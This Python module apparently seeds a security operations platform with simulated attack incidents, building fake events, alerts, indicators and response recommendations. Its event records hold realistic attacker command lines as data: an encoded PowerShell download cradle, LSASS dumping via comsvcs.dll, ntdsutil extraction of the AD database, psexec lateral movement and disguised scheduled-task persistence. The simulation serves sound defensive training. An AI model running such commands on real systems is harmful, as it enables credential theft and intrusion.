import uuid
import random
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any
from sqlalchemy.orm import Session

from app.models.event import SecurityEvent
from app.models.alert import Alert
from app.models.incident import Incident
from app.models.indicator import Indicator


_HOSTNAMES = [
    "WORKSTATION-042", "WORKSTATION-089", "WORKSTATION-117", "WORKSTATION-203",
    "WORKSTATION-318", "WORKSTATION-456", "WORKSTATION-521", "WORKSTATION-609",
    "WORKSTATION-773", "WORKSTATION-884", "WORKSTATION-912",
    "FINANCE-SRV-01", "DC-PRIMARY-02", "WEBAPP-NODE-07", "ENGINEERING-155",
    "HR-WS-033", "EXEC-SURFACE-01", "MARKETING-240", "OPERATIONS-099"
]

_VICTIM_USERS = [
    "victim.user@enterprise.com", "finance.lead@enterprise.com",
    "marketing.mgr@enterprise.com", "sys.admin@enterprise.com",
    "hr.specialist@enterprise.com", "engineering.dev@enterprise.com",
    "operations.coord@enterprise.com", "sales.exec@enterprise.com",
    "legal.counsel@enterprise.com", "product.owner@enterprise.com"
]

_PHISH_DOMAINS = [
    "phish-payroll-update.net", "hr-benefits-login-verify.com",
    "office365-verify-account.ru", "dropbox-file-share-invite.cn",
    "it-password-reset-portal.co", "slack-team-invite-join.net",
    "invoice-payment-urgent.cc", "zoom-meeting-join-now.com"
]

_C2_DOMAINS = [
    "c2-command-node.ru", "cobalt-strike-beacon.cn",
    "metasploit-payload.cc", "empire-listener.hk",
    "sliver-c2-relay.online", "brute-ratel-dispatch.net"
]

_MALICIOUS_IPS = [
    "198.51.100.44", "203.0.113.87", "192.0.2.156", "185.220.101.34",
    "45.155.205.233", "91.219.236.218", "103.224.182.251", "5.188.210.13"
]

_INTERNAL_IPS = [f"10.0.{random.randint(0, 20)}.{random.randint(2, 254)}" for _ in range(40)]
_SRC_EXTERNAL_IPS = [f"203.0.{random.randint(110, 120)}.{random.randint(1, 254)}" for _ in range(30)]

_THREAT_ACTORS = ["APT-29 Sim", "APT-28 Sim", "FIN-7 Sim", "CRIME-045", "TA505 Sim", "LAZARUS Sim"]
_ENRICH_SOURCES = ["VirusTotal / ThreatFox", "AlienVault OTX", "IBM X-Force Exchange", "MISP Community Feed", "Anomali ThreatStream"]

_SCENARIO_VARIANTS = [
    {
        "name": "Phishing -> Encoded PowerShell -> LSASS Dump -> C2 Beaconing",
        "variant": "classic_apt_chain"
    },
    {
        "name": "RDP Brute Force -> Lateral Movement -> Crypto Ransomware Staging",
        "variant": "ransomware_chain"
    },
    {
        "name": "Webshell Upload -> Credential Harvest -> Data Exfiltration Over DNS",
        "variant": "data_exfil_chain"
    },
    {
        "name": "USB Dropper -> Scheduled Task Persistence -> Reverse Shell",
        "variant": "usb_initial_chain"
    }
]


def _rand(namespace_list: List[str]) -> str:
    return random.choice(namespace_list)


def generate_synthetic_attack_scenario(db: Session, tenant_id: str = "tenant_default") -> Dict[str, Any]:
    now = datetime.now(timezone.utc)

    scenario = _rand(_SCENARIO_VARIANTS)
    variant = scenario["variant"]

    hostname = _rand(_HOSTNAMES)
    internal_ip = random.choice(_INTERNAL_IPS)
    victim_user = _rand(_VICTIM_USERS)
    phish_domain = _rand(_PHISH_DOMAINS)
    c2_domain = _rand(_C2_DOMAINS)
    malicious_ip = _rand(_MALICIOUS_IPS)
    external_src_ip = random.choice(_SRC_EXTERNAL_IPS)
    threat_actor = _rand(_THREAT_ACTORS)
    enrich_source = _rand(_ENRICH_SOURCES)

    # Random time offset jitter
    t_phish = now - timedelta(minutes=45 + random.randint(0, 30), seconds=random.randint(0, 60))
    t_exec = t_phish + timedelta(minutes=random.randint(8, 20), seconds=random.randint(0, 60))
    t_creds = t_exec + timedelta(minutes=random.randint(3, 12), seconds=random.randint(0, 60))
    t_dns = t_creds + timedelta(minutes=random.randint(2, 8), seconds=random.randint(0, 60))
    t_c2 = t_dns + timedelta(minutes=random.randint(3, 15), seconds=random.randint(0, 60))

    # ============ Build events based on scenario variant ============
    events_raw = []
    if variant == "classic_apt_chain":
        events_raw = [
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_phish.isoformat(),
                "source": "email_gateway",
                "event_type": "phishing_delivery",
                "severity": "medium",
                "user": victim_user,
                "src_ip": external_src_ip,
                "dst_ip": internal_ip,
                "domain": phish_domain,
                "hostname": hostname,
                "raw_data": f"Inbound email containing suspicious link: http://{phish_domain}/login.php delivered to {victim_user}"
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_exec.isoformat(),
                "source": "edr",
                "event_type": "process_creation",
                "severity": "high",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "powershell.exe",
                "command_line": f"powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJ2h0dHA6Ly8{uuid.uuid4().hex[:8]}L3BheWxvYWQucHMxJyk=",
                "file_hash": f"{uuid.uuid4().hex}{uuid.uuid4().hex}",
                "raw_data": f"Encoded PowerShell execution spawned by WINWORD.EXE on {hostname}"
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_creds.isoformat(),
                "source": "edr",
                "event_type": "credential_dump",
                "severity": "critical",
                "user": "SYSTEM",
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "lsass.exe",
                "command_line": f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {random.randint(500, 999)} C:\\Windows\\Temp\\lsass_{uuid.uuid4().hex[:6]}.dmp full",
                "raw_data": f"lsass process memory read detected originating from process rundll32.exe on {hostname}"
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_dns.isoformat(),
                "source": "dns",
                "event_type": "dns_query",
                "severity": "medium",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "domain": c2_domain,
                "raw_data": f"High entropy DNS resolution query for {c2_domain}"
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_c2.isoformat(),
                "source": "firewall",
                "event_type": "network_conn",
                "severity": "high",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "dst_ip": malicious_ip,
                "dst_port": random.choice([443, 8443, 8080, 4443]),
                "raw_data": f"Outbound TLS connection to suspicious external IP {malicious_ip} with self-signed certificate (JA3 anomalous)"
            }
        ]
    elif variant == "ransomware_chain":
        second_host = _rand([h for h in _HOSTNAMES if h != hostname])
        second_ip = random.choice([ip for ip in _INTERNAL_IPS if ip != internal_ip])
        events_raw = [
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_phish.isoformat(),
                "source": "firewall",
                "event_type": "brute_force",
                "severity": "high",
                "user": "administrator@enterprise.com",
                "src_ip": external_src_ip,
                "dst_ip": internal_ip,
                "hostname": hostname,
                "raw_data": f"RDP brute force: 1,247 failed login attempts in 5 min from {external_src_ip} targeting {hostname}:3389. 1 successful authentication."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_exec.isoformat(),
                "source": "identity",
                "event_type": "lateral_movement",
                "severity": "high",
                "user": "administrator@enterprise.com",
                "hostname": hostname,
                "src_ip": internal_ip,
                "dst_ip": second_ip,
                "process_name": "mimikatz.exe",
                "command_line": f"psexec.exe \\\\{second_host} -s cmd.exe /c \"copy \\\\{hostname}\\c$\\sys.exe c:\\windows\\temp\\sys.exe\"",
                "raw_data": f"SMB lateral movement from {hostname} to {second_host} using compromised admin credentials."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_creds.isoformat(),
                "source": "edr",
                "event_type": "scheduled_task",
                "severity": "high",
                "user": "SYSTEM",
                "hostname": second_host,
                "src_ip": second_ip,
                "process_name": "schtasks.exe",
                "command_line": f"schtasks.exe /Create /SC MINUTE /MO 5 /TN \"Windows Update Service\" /TR \"C:\\Windows\\Temp\\sys.exe\" /RU SYSTEM",
                "raw_data": f"Persistence: Suspicious scheduled task created on {second_host} pointing to unsigned executable in Temp."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_dns.isoformat(),
                "source": "edr",
                "event_type": "file_modification",
                "severity": "critical",
                "user": "SYSTEM",
                "hostname": second_host,
                "src_ip": second_ip,
                "process_name": "sys.exe",
                "raw_data": f"High entropy file writes on {second_host} with .encrypted file extension pattern, 4,210 files modified in 120 seconds."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_c2.isoformat(),
                "source": "dns",
                "event_type": "dns_query",
                "severity": "high",
                "hostname": second_host,
                "src_ip": second_ip,
                "domain": f"ransom-{uuid.uuid4().hex[:8]}.onion.pet",
                "raw_data": f"DNS query for suspicious ransomware payment gateway domain."
            }
        ]
    elif variant == "data_exfil_chain":
        events_raw = [
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_phish.isoformat(),
                "source": "edr",
                "event_type": "file_upload",
                "severity": "medium",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "file_hash": f"{uuid.uuid4().hex}{uuid.uuid4().hex}",
                "raw_data": f"Webshell {uuid.uuid4().hex[:6]}.aspx uploaded to /owa/auth/ on EXCHANGE-SRV-01 via unauthenticated ProxyShell vulnerability."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_exec.isoformat(),
                "source": "identity",
                "event_type": "credential_access",
                "severity": "high",
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "w3wp.exe",
                "command_line": "cmd.exe /c whoami && net user /domain",
                "raw_data": f"Command execution via webshell: reconnaissance enumerating domain trusts and users."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_creds.isoformat(),
                "source": "edr",
                "event_type": "credential_dump",
                "severity": "critical",
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "ntdsutil.exe",
                "command_line": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\\ntds\" q q",
                "raw_data": f"ntdsutil.exe used to create Install From Media backup of Active Directory NTDS.dit hive (credential theft)."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_dns.isoformat(),
                "source": "dns",
                "event_type": "dns_tunnel",
                "severity": "high",
                "hostname": hostname,
                "src_ip": internal_ip,
                "domain": f"{uuid.uuid4().hex[:10]}.{c2_domain}",
                "raw_data": f"High-volume DNS TXT record queries (>4,500 in 15 min) indicative of DNS tunneling data exfiltration."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_c2.isoformat(),
                "source": "firewall",
                "event_type": "data_exfil",
                "severity": "critical",
                "hostname": hostname,
                "src_ip": internal_ip,
                "dst_ip": malicious_ip,
                "dst_port": 53,
                "raw_data": f"Large outbound data transfer (2.3GB) to {malicious_ip}:53, far exceeding baseline DNS traffic for {hostname}."
            }
        ]
    else:  # usb_initial_chain
        events_raw = [
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_phish.isoformat(),
                "source": "edr",
                "event_type": "process_creation",
                "severity": "medium",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "cmd.exe",
                "command_line": f"cmd.exe /c E:\\launcher.bat",
                "raw_data": f"Batch file execution originating from removable USB media E: on {hostname}."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_exec.isoformat(),
                "source": "edr",
                "event_type": "process_injection",
                "severity": "high",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "explorer.exe",
                "raw_data": f"Process hollowing detected: unsigned remote thread 0x{random.randint(1000, 9999):x} injected into explorer.exe from USB stage DLL."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_creds.isoformat(),
                "source": "identity",
                "event_type": "scheduled_task",
                "severity": "high",
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "schtasks.exe",
                "command_line": f"schtasks.exe /Create /SC ONLOGON /TN \"WinTelemetry\" /TR \"rundll32 c:\\programdata\\mt_{uuid.uuid4().hex[:6]}.dll,Run\" /RU {victim_user}",
                "raw_data": f"User logon scheduled task registered pointing to unknown DLL in ProgramData."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_dns.isoformat(),
                "source": "dns",
                "event_type": "dns_query",
                "severity": "medium",
                "hostname": hostname,
                "src_ip": internal_ip,
                "domain": c2_domain,
                "raw_data": f"DGA-like pseudo-random domain query for {c2_domain}."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_c2.isoformat(),
                "source": "firewall",
                "event_type": "reverse_shell",
                "severity": "critical",
                "hostname": hostname,
                "src_ip": internal_ip,
                "dst_ip": malicious_ip,
                "dst_port": 4443,
                "raw_data": f"TCP socket egress to {malicious_ip}:4443 with periodic 60-second heartbeat beacon pattern, reverse shell confirmation (interactive TTY prompt)."
            }
        ]

    created_events = []
    created_event_ids = []
    for item in events_raw:
        evt = SecurityEvent(
            id=f"evt_sim_{uuid.uuid4().hex[:10]}",
            event_id=item["event_id"],
            timestamp=datetime.fromisoformat(item["timestamp"]),
            source=item["source"],
            event_type=item["event_type"],
            severity=item["severity"],
            src_ip=item.get("src_ip"),
            dst_ip=item.get("dst_ip"),
            dst_port=item.get("dst_port"),
            domain=item.get("domain"),
            user=item.get("user"),
            process_name=item.get("process_name"),
            command_line=item.get("command_line"),
            file_hash=item.get("file_hash"),
            hostname=item.get("hostname"),
            raw_data=item["raw_data"],
            metadata_json={
                "simulated_scenario": scenario["name"],
                "variant": variant,
                "threat_actor": threat_actor
            },
            tenant_id=tenant_id,
            is_simulated="true"
        )
        db.add(evt)
        created_events.append(evt)
        created_event_ids.append(evt.id)

    # ============ Alerts (variant-specific titles) ============
    if variant == "classic_apt_chain":
        a1_title = "Suspicious Obfuscated PowerShell Execution"
        a1_desc = f"Encoded PowerShell script spawned by Office binary WINWORD.EXE downloading external payload on {hostname}."
        a1_sev = "high"
        a1_rule = "EDR_RULE_POWERSHELL_ENC"
        a1_src = "edr"

        a2_title = "Potential LSASS Credential Dumping via Comsvcs"
        a2_desc = f"Process comsvcs.dll attempted to generate minidump of lsass.exe process memory on {hostname}."
        a2_sev = "critical"
        a2_rule = "EDR_RULE_LSASS_DUMP"
        a2_src = "edr"

        a3_title = "Outbound C2 Beaconing to Known Malicious IP"
        a3_desc = f"{hostname} established outbound TLS connection to high-risk IP {malicious_ip}."
        a3_sev = "high"
        a3_rule = "FW_RULE_C2_OUTBOUND"
        a3_src = "firewall"
    elif variant == "ransomware_chain":
        a1_title = "RDP Brute Force Successful Authentication"
        a1_desc = f"1,247 failed RDP attempts culminating in successful admin login from {external_src_ip} on {hostname}."
        a1_sev = "high"
        a1_rule = "FW_RULE_RDP_BRUTE"
        a1_src = "firewall"

        a2_title = "SMB Lateral Movement via Compromised Creds"
        a2_desc = f"Psexec lateral movement using stolen domain admin credentials targeting second host."
        a2_sev = "critical"
        a2_rule = "EDR_RULE_LATERAL_MOVE"
        a2_src = "identity"

        a3_title = "Mass File Encryption Ransomware Pattern"
        a3_desc = f"4,210 file modifications with .encrypted extensions on {hostname} - ransomware staging confirmed."
        a3_sev = "critical"
        a3_rule = "EDR_RULE_RANSOM_ENCRYPT"
        a3_src = "edr"
    elif variant == "data_exfil_chain":
        a1_title = "Unauthenticated Webshell Upload via ProxyShell"
        a1_desc = f"ASPX webshell planted in Outlook Web Access auth directory on Exchange server."
        a1_sev = "high"
        a1_rule = "WAF_RULE_WEBSHELL_UPLOAD"
        a1_src = "edr"

        a2_title = "NTDS.dit Active Directory Credential Theft"
        a2_desc = f"ntdsutil.exe used to create full IFM backup of Active Directory database hive."
        a2_sev = "critical"
        a2_rule = "EDR_RULE_NTDS_DUMP"
        a2_src = "edr"

        a3_title = "2.3GB Data Exfiltration via DNS Tunneling"
        a3_desc = f"Massive data egress via high-volume DNS TXT queries to malicious domain {c2_domain}."
        a3_sev = "critical"
        a3_rule = "DNS_RULE_TUNNEL_EXFIL"
        a3_src = "dns"
    else:  # usb
        a1_title = "USB Removable Media Auto-Execution"
        a1_desc = f"Batch script launch from removable USB drive E: on {hostname} - possible USB dropper infection."
        a1_sev = "medium"
        a1_rule = "EDR_RULE_USB_LAUNCHER"
        a1_src = "edr"

        a2_title = "Process Hollowing Injection into Explorer.exe"
        a2_desc = f"Unsigned remote thread injected into explorer.exe process memory via hollowing technique."
        a2_sev = "high"
        a2_rule = "EDR_RULE_PROC_INJECT"
        a2_src = "edr"

        a3_title = "Interactive Reverse Shell Egress Confirmed"
        a3_desc = f"Periodic 60-second beacons + TTY prompt detected: reverse shell active on {hostname} to {malicious_ip}."
        a3_sev = "critical"
        a3_rule = "FW_RULE_REV_SHELL"
        a3_src = "firewall"

    alert_1 = Alert(
        id=f"alt_sim_{uuid.uuid4().hex[:10]}",
        title=a1_title,
        description=a1_desc,
        severity=a1_sev,
        status="new",
        source=a1_src,
        rule_name=a1_rule,
        event_ids=[created_event_ids[0], created_event_ids[1]] if variant in ["classic_apt_chain", "ransomware_chain"] else [created_event_ids[1]],
        asset_id=hostname,
        tenant_id=tenant_id,
        is_simulated="true"
    )
    alert_2 = Alert(
        id=f"alt_sim_{uuid.uuid4().hex[:10]}",
        title=a2_title,
        description=a2_desc,
        severity=a2_sev,
        status="new",
        source=a2_src,
        rule_name=a2_rule,
        event_ids=[created_event_ids[2], created_event_ids[1]] if len(created_event_ids) > 3 else [created_event_ids[2]],
        asset_id=hostname,
        tenant_id=tenant_id,
        is_simulated="true"
    )
    alert_3 = Alert(
        id=f"alt_sim_{uuid.uuid4().hex[:10]}",
        title=a3_title,
        description=a3_desc,
        severity=a3_sev,
        status="new",
        source=a3_src,
        rule_name=a3_rule,
        event_ids=[created_event_ids[3], created_event_ids[4]],
        asset_id=hostname,
        tenant_id=tenant_id,
        is_simulated="true"
    )

    db.add_all([alert_1, alert_2, alert_3])

    # ============ Indicators ============
    ind_ip = Indicator(
        id=f"ind_sim_{uuid.uuid4().hex[:10]}",
        indicator_value=malicious_ip,
        indicator_type="ip",
        reputation_score=round(75 + random.random() * 23, 1),
        risk_level=random.choice(["high", "critical", "high"]),
        threat_actor=threat_actor,
        source_attribution=enrich_source,
        raw_enrichment={
            "positives": random.randint(28, 62),
            "total": 70,
            "tags": random.sample(["c2", "cobalt-strike", "ransomware", "exfil", "dga", "phishing", "malware-distribution"], k=random.randint(2, 4))
        },
        confidence=round(0.85 + random.random() * 0.14, 2),
        tenant_id=tenant_id
    )
    ind_domain = Indicator(
        id=f"ind_sim_{uuid.uuid4().hex[:10]}",
        indicator_value=c2_domain,
        indicator_type="domain",
        reputation_score=round(80 + random.random() * 19, 1),
        risk_level="critical",
        threat_actor=threat_actor,
        source_attribution=enrich_source,
        raw_enrichment={
            "pulse_count": random.randint(8, 28),
            "tags": random.sample(["c2", "phishing", "exfil", "dga", "malware", "ransomware-c2"], k=random.randint(2, 4))
        },
        confidence=round(0.90 + random.random() * 0.09, 2),
        tenant_id=tenant_id
    )
    db.add_all([ind_ip, ind_domain])

    # ============ Incident ============
    inc_severity = "critical"
    if variant == "ransomware_chain":
        inc_title = f"[Simulated] Ransomware Deployment: RDP Brute -> Lateral Move -> Encryption on {hostname}"
        inc_desc = f"Guided incident: Successful RDP brute force from {external_src_ip}, SMB lateral movement to secondary host, then mass .encrypted file writes consistent with crypto ransomware staging."
    elif variant == "data_exfil_chain":
        inc_title = f"[Simulated] Data Breach: Webshell -> NTDS Theft -> DNS Exfiltration via {c2_domain}"
        inc_desc = f"Guided incident: Exchange webshell upload, full Active Directory credential theft via NTDS.dit IFM, then 2.3GB of data exfiltrated via DNS tunneling to {c2_domain}."
    elif variant == "usb_initial_chain":
        inc_title = f"[Simulated] USB Dropper: Removable Media -> Injection -> Reverse Shell to {malicious_ip}"
        inc_desc = f"Guided incident: USB launcher.bat auto-exec, process hollowing injection into explorer.exe, scheduled task persistence, then interactive reverse shell egress to {malicious_ip}:4443."
    else:
        inc_title = f"[Simulated] Multi-Stage Credential Theft & Outbound C2 on {hostname}"
        inc_desc = f"Guided incident: Phishing delivery from {phish_domain} followed by obfuscated PowerShell payload, LSASS memory dump, and active TLS C2 beaconing to {malicious_ip}."

    incident = Incident(
        id=f"inc_sim_{uuid.uuid4().hex[:10]}",
        title=inc_title,
        description=inc_desc,
        severity=inc_severity,
        status="investigating",
        alert_ids=[alert_1.id, alert_2.id, alert_3.id],
        indicator_ids=[ind_ip.id, ind_domain.id],
        mitre_techniques=random.sample(
            ["T1059.001", "T1003.001", "T1071.001", "T1566.002", "T1021.002", "T1486", "T1041", "T1053.005", "T1078.003", "T1055.012"],
            k=3
        ),
        timeline_json=[
            {
                "timestamp": events_raw[0]["timestamp"],
                "event_type": events_raw[0]["event_type"],
                "title": f"Stage 1: {events_raw[0]['event_type'].replace('_', ' ').title()}",
                "description": events_raw[0]["raw_data"],
                "severity": events_raw[0]["severity"],
                "source": events_raw[0]["source"]
            },
            {
                "timestamp": events_raw[1]["timestamp"],
                "event_type": events_raw[1]["event_type"],
                "title": f"Stage 2: {events_raw[1]['event_type'].replace('_', ' ').title()}",
                "description": events_raw[1]["raw_data"],
                "severity": events_raw[1]["severity"],
                "source": events_raw[1]["source"]
            },
            {
                "timestamp": events_raw[2]["timestamp"],
                "event_type": events_raw[2]["event_type"],
                "title": f"Stage 3: {events_raw[2]['event_type'].replace('_', ' ').title()}",
                "description": events_raw[2]["raw_data"],
                "severity": events_raw[2]["severity"],
                "source": events_raw[2]["source"]
            },
            {
                "timestamp": events_raw[4]["timestamp"],
                "event_type": events_raw[4]["event_type"],
                "title": f"Stage 4: {events_raw[4]['event_type'].replace('_', ' ').title()}",
                "description": events_raw[4]["raw_data"],
                "severity": events_raw[4]["severity"],
                "source": events_raw[4]["source"]
            }
        ],
        recommendations_json=[
            {
                "category": "response",
                "title": f"Isolate {hostname} from Network",
                "description": f"Isolate {hostname} immediately via EDR agent to prevent further lateral movement and exfiltration.",
                "priority": "high",
                "requires_approval": True
            },
            {
                "category": "response",
                "title": f"Reset Credentials for {victim_user if variant in ['classic_apt_chain', 'usb_initial_chain'] else 'All Affected Domain Admins'}",
                "description": "Force password reset and revoke all active SSO / Kerberos session tokens for affected accounts.",
                "priority": "high",
                "requires_approval": True
            },
            {
                "category": "investigative",
                "title": f"Block Indicator {malicious_ip} & {c2_domain} on Perimeter",
                "description": f"Add {malicious_ip} and {c2_domain} to firewall egress blocklist + DNS RPZ sinkhole.",
                "priority": "medium",
                "requires_approval": False
            }
        ],
        tenant_id=tenant_id,
        is_simulated="true"
    )

    db.add(incident)
    db.commit()

    return {
        "incident_id": incident.id,
        "alerts_count": 3,
        "events_count": len(created_events),
        "indicators_count": 2,
        "scenario": scenario["name"],
        "variant": variant,
        "asset_id": hostname,
        "threat_actor": threat_actor,
        "malicious_ip": malicious_ip,
        "c2_domain": c2_domain,
        "is_simulated": True
    }
